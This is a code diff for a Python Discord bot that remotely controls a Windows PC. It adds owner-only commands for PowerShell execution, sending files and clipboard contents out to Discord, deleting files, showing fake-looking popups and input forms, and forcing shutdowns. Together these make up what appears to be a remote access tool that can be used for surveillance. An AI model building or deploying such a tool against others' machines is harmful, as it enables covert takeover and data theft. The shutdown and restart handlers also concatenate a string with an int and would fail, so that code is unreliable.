@@ -1,4 +1,3 @@
-from types import NoneType
 import asyncio
 import getpass
 import socket
@@ -10,8 +9,19 @@ from discord import TextChannel
 from discord.ext import commands
 from discord.ext.commands import Context
 
+from src.cmd.clipboard import get_clipboard
+from src.cmd.delete_file import delete_file
+from src.cmd.download_file import download_file
+from src.cmd.input_box import inputbox_show
+from src.cmd.move_file import move_file
+from src.cmd.msgbox import msgbox_show
+from src.cmd.openurl import spawn_proc
+from src.cmd.popup import popup_show
 from src.cmd.screenshot import take_screenshot
 from src.cmd.shell import execute_cmd
+from src.cmd.upload_file import upload_file
+from src.cmd.voice import voice_api
+from src.cmd.wallpaper import set_wallpaper
 from src.constants import UPDATE_TAG, VERSION
 
 intents = discord.Intents.default()
@@ -78,6 +88,12 @@ async def on_message(message: discord.Message):
     if not channel or message.channel.id != channel.id:
         return
 
+    if (
+        message.content.strip().lower() == "yes"
+        or message.content.strip().lower() == "no"
+    ):
+        return
+
     if not message.content.startswith(bot.command_prefix):
         global exit_confirmation
 
@@ -95,7 +111,7 @@ async def on_message(message: discord.Message):
 # ====================
 # === PING COMMAND ===
 # ====================
-@bot.command(name="ping", brief="Check the bot's latency.")
+@bot.command(name="ping", description="Check the bot's latency.")
 async def ping(ctx: Context, *, args: str | None):
     latency = round(bot.latency * 1000)  # latency in milliseconds
 
@@ -110,7 +126,7 @@ async def ping(ctx: Context, *, args: str | None):
 # =========================
 # === SHELL COMMAND ===
 # =========================
-@bot.command(name="shell", brief="Run powershell commands")
+@bot.command(name="shell", description="Run powershell commands")
 @commands.is_owner()
 @commands.guild_only()
 async def shell(ctx: Context, *, user_cmd: str | None):
@@ -129,9 +145,150 @@ async def shell(ctx: Context, *, user_cmd: str | None):
 # ===========================
 @bot.command(
     name="screenshot",
-    brief="Capture the bot host's screen",
+    description="Capture the bot host's screen",
 )
 @commands.is_owner()
 @commands.guild_only()
 async def screenshot(ctx):
     await take_screenshot(ctx)
+
+
+# ===========================
+# === VOICE COMMAND ===
+# ===========================
+@bot.command(name="voice", description="Speak text aloud using Windows text-to-speech.")
+@commands.is_owner()
+@commands.guild_only()
+async def voice(ctx, *, text: str):
+    await voice_api(ctx, text)
+
+
+# ===========================
+# === OPENURL COMMAND ===
+# ===========================
+@bot.command(
+    name="openurl", description="Open a URL in the Windows computer's default browser."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def open_url(ctx, *, url: str):
+    await spawn_proc(ctx, url)
+
+
+# ===========================
+# === UPLOAD COMMAND ===
+# ===========================
+@bot.command(
+    name="upload",
+    description="Download a file from an attachment or URL and upload it to Discord.",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def upload(ctx, url: str | None = None):
+    await upload_file(ctx, url)
+
+
+# ===========================
+# === DOWNLOAD COMMAND ===
+# ===========================
+@bot.command(
+    name="download", description="Resolve a file path and send the file to Discord."
+)
+@commands.is_owner()
+@commands.guild_only()
+async def download(ctx, *, path: str):
+    await download_file(ctx, path)
+
+
+# ===========================
+# === DELETE COMMAND ===
+# ===========================
+@bot.command(name="delete", description="Delete a file or a folder")
+@commands.is_owner()
+@commands.guild_only()
+async def delete(ctx, *, path: str):
+    await delete_file(bot, ctx, path)
+
+
+# ===========================
+# === MOVE FILE COMMAND ===
+# ===========================
+@bot.command(name="move", description="moves files and folders from <src> to <dest>")
+@commands.is_owner()
+@commands.guild_only()
+async def move(ctx, *, paths: str):
+    await move_file(ctx, paths)
+
+
+# ===========================
+# === POPUP COMMAND ===
+# ===========================
+@bot.command(name="popup", description="Display a native windows popup msgbox")
+@commands.is_owner()
+@commands.guild_only()
+async def popup(ctx, *, msg: str):
+    await popup_show(ctx, msg)
+
+
+# ===========================
+# === MSGBOX COMMAND ===
+# ===========================
+@bot.command(
+    name="msgbox",
+    description="Display a native windows popup msgbox with custom buttons",
+)
+@commands.is_owner()
+@commands.guild_only()
+async def msgbox(ctx, *, args: str):
+    await msgbox_show(ctx, args)
+
+
+@bot.command(name="inputbox", description="Display a native windows input form")
+@commands.is_owner()
+@commands.guild_only()
+async def inputbox(ctx, title: str, *, prompt: str):
+    await inputbox_show(ctx, title, prompt)
+
+
+# ===========================
+# === SHUTDOWN COMMAND ===
+# ===========================
+@bot.command(name="shutdown", description="shutdown PC immediately")
+@commands.is_owner()
+@commands.guild_only()
+async def shutdown(ctx, timeout: str | None):
+    shutdown_cmd = r"shutdown /s /t " + int(timeout)
+    result = execute_cmd(shutdown_cmd) or f"PC about to shutdown in {int(timeout)}s"
+    await ctx.reply(result)
+
+
+# ===========================
+# === RESTART COMMAND ===
+# ===========================
+@bot.command(name="restart", description="restart PC immediately")
+@commands.is_owner()
+@commands.guild_only()
+async def restart(ctx, timeout: str | None):
+    shutdown_cmd = r"shutdown /r /t " + int(timeout)
+    result = execute_cmd(shutdown_cmd) or f"PC about to restart in {int(timeout)}s"
+    await ctx.reply(result)
+
+
+# ===========================
+# === WALLPAPER COMMAND ===
+# ===========================
+@bot.command(name="wallpaper", description="Sets the wallpaper of the image provided")
+@commands.is_owner()
+@commands.guild_only()
+async def wallpaper(ctx):
+    await set_wallpaper(ctx)
+
+
+# ===========================
+# === CLIPBOARD COMMAND ===
+# ===========================
+@bot.command(name="clipboard", description="Gets content from users clipboard")
+@commands.is_owner()
+@commands.guild_only()
+async def clipboard(ctx, action: str = "read", *, text: str = None):
+    await get_clipboard(ctx, action, text)
